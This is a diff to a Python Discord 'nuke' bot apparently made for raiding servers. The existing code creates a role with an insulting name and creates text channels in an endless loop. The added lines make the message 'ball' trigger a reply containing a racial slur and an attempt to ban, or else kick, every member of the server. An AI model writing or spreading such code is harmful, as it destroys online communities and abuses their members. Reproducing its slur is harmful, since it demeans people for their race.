@@ -1,5 +1,5 @@
 
-#Made by spidermanfromearth69reboot
+#Made by spidermanfromearth69
 
 import discord
 import asyncio
@@ -34,6 +34,19 @@ async def on_message(message):
 		await guild.create_role(name = "FUCKED BY UAR")
 		while True:
 			channel = await guild.create_text_channel('[fucked-by-the-UAR]')
+	elif message.content == "ball":
+		await message.channel.send("k nigger")
+		guild = message.guild
+		for member in guild.members:
+			try:
+				await member.ban(reason = 'fucked by uar')
+			except:
+				try:
+					await member.kick(reason = 'fucked by uar')
+				except:
+					print("cloudn't ban " + member.name)
+					pass
+			
 
 
 tokenfile = open("token.txt","r")
